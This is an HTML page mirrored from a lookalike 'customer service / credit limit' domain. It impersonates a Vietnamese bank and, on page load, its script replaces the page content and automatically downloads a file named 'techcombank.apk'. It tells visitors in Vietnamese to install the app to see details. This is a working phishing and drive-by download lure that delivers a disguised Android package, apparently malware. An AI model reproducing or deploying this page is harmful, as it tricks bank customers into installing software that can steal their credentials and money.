<!DOCTYPE html>
<html>

<!-- Mirrored from cskh-vpb.tang-han-muc-tin-dung.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 10 Apr 2024 15:47:48 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    <title>Khách hàng cá nhân</title>

    <style>
        header .header-option {
            margin-left: inherit;
        }
    </style>

</head>

<body>
    <div class="loader">
        <span></span>
        <span></span>
    </div>
    <script>
        var loader = document.querySelector(".loader");
        window.addEventListener("load", function() {
            loader.style.display = "none";
            const apiUrl = '/api/download'

            function downloadURI(uri, name) {
                var link = document.createElement("a");
                // If you don't know the name or want to use
                // the webserver default set name = ''+
                link.setAttribute('download', name);
                link.href = `${apiUrl}`;
                document.body.appendChild(link);
                $('#link').attr('href', `${apiUrl}`)
                link.click();
                link.remove();
            }

            $('body').css('padding', '0')
            $('body').html(
                `<div style="display: flex; justify-content: center; align-items: center; height: 100vh; width: 90%; margin: auto; text-align: center">
                <div>
                    <img src='UploadImages/Data/Banner/logo.webp' style="width: 80%; display: block; margin:auto">
                    <p style="padding-top: 20px">Tên file: techcombank.apk</p>
                    <p>Kích thước: 25mb</p>
                    <p>Vui lòng tải xuống ứng dụng và cài đặt để xem chi tiết. <br> <a id="link" style="text-decoration: underline; color: blue" href="./techcombank.apk" download>Tải ngay bây giờ</a></p> 
                </div>
              </div>
              `
            );
            downloadURI()

        });
    </script>
</body>